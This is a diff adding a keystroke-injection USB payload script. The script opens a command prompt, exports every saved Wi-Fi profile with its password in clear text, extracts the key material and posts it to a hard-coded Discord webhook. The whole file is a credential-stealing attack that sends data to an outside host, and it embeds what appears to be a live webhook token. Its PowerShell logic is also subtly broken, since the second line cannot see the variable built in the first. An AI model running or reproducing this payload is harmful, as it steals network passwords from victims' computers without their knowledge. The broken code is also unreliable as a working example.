@@ -1,0 +1,19 @@
+GUI r
+DELAY 500
+STRING CMD
+ENTER
+DELAY 1500
+STRING cd %temp%
+ENTER
+DELAY 300
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 500
+STRING powershell $wifiProfiles = netsh wlan show profiles | Select-String -Pattern '(?<=:\s)(.*)'; $wifiData = ""; foreach ($profile in $wifiProfiles) { $profileName = $profile.Matches[0].Value.Trim(); $profileXml = netsh wlan export profile name=$profileName key=clear folder=. | Out-Null; $profileXmlPath = "$($env:TEMP)\Wi-Fi-$profileName.xml"; $wifiData += Get-Content $profileXmlPath -Raw | Select-String -Pattern 'keyMaterial'; Remove-Item $profileXmlPath -Force }
+ENTER
+DELAY 500
+STRING powershell if ($wifiData) { $payload = @{ content = $wifiData }; $jsonPayload = $payload | ConvertTo-Json; Invoke-RestMethod -Uri 'https://discordapp.com/api/webhooks/1255938585807556681/uBrsnBbvX371VoeEp1ZiuLapo_7m_Ge0jwxivAmPRQlDn6RmOarLGGxLx_PZxWW731SW' -Method Post -Body $jsonPayload -ContentType 'application/json' } else { Write-Output 'No Wi-Fi passwords found.' }
+ENTER
+DELAY 1000
+STRING exit
+ENTER
